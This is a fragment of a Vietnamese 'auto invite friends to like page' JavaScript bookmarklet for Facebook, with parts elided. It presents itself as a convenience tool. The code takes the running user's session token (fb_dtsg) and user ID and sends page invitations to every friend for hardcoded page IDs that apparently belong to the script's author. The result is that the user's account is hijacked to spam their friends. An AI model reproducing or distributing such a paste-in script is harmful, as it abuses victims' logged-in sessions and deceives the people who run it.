...
//like page
javascript: var Title = "Auto mời bạn bè like page </A>";
var Descriptions = "",
    _text = 'Code Mời Bạn Bè Like Page</br>Kịch bản </A><A style="color:#3B5998;" href="http://www.facebook.com/ChemGio18x" target="_blank"> Monkeys Wild</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/teamgau" target="_blank"> Có Gì Hót ?</A></A>.</br>Page Của Tôi<A style="color:#3B5998;" href="http://blog.ct98.net/" target="_blank"></A>.</A>';
...
function InviteFriends(opo) {
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=454920977919944&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=599487090131706&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
